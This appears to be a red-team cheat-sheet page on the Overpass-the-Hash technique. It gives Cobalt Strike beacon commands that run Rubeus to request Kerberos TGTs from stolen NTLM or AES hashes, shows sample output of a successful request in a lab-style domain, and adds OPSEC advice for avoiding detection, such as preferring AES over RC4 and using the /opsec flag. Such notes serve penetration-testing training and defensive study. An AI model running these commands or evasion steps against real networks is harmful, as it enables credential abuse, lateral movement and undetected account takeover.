# Overpass The Hash

## Overpass The Hash

Overpass The Hash is a technique that allows us to request a kerberos TGT for a user, using their NTLM or AES hash.

#### <mark style="color:red;">Note</mark>: Elevated privileges are required to obtain a user hash, but not needed to request a kerberos TGT.

## Cobalt Strike - Rubeus w/ NTLM

```powershell
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:robert /ntlm:2B576ACBE6BCFDA7294D6BD18041B8FE /nowrap

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 2B576ACBE6BCFDA7294D6BD18041B8FE
[*] Building AS-REQ (w/ preauth) for: 'dev.rotta.dev\robert'
[*] Using domain controller: 10.15.211.9:88

[09/01 10:24:04] [+] received output:
[+] TGT request successful!
[*] base64(ticket.kirbi):

  ServiceName              :  krbtgt/dev.rotta.dev
  ServiceRealm             :  DEV.ROTTA.DEV
  UserName                 :  robert
  UserRealm                :  DEV.ROTTA.DEV
  ...
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  MkI1NzZBQ0JFNkJDRkRBNzI5NEQ2QkQxODA0MUI4RkU=
  ASREP (key)              :  2B576ACBE6BCFDA7294D6BD18041B8FE
```

Note: Now that we've obtained a TGT, it can then be leveraged via Pass the Ticket.

### OPSEC

<mark style="color:red;">**Note**</mark>: Using an NTLM hash results in a ticket encrypted using RC4 (0x17). This is considered a legacy encryption type and therefore often stands out as anomalous in a modern Windows environment. It's better to request a TGT with AES than it is with NTLM. _**The below example is better OPSEC.**_

## Cobalt Strike - Rubeus w/ AES

```powershell
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:robert /aes256:<aeshash> /nowrap
```

## OPSEC

If no `/domain` is specified, Rubeus uses the FQDN of the domain this computer is in.  Instead, we can force it to use the NetBIOS name with `/domain:DEV`. &#x20;

The `/opsec` flag  tells Rubeus to request the TGT in a way that results in the Ticket Options being 0x40810010.

```powershell
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:robert /aes256:<aeshash> /domain:DEV /opsec /nowrap
```
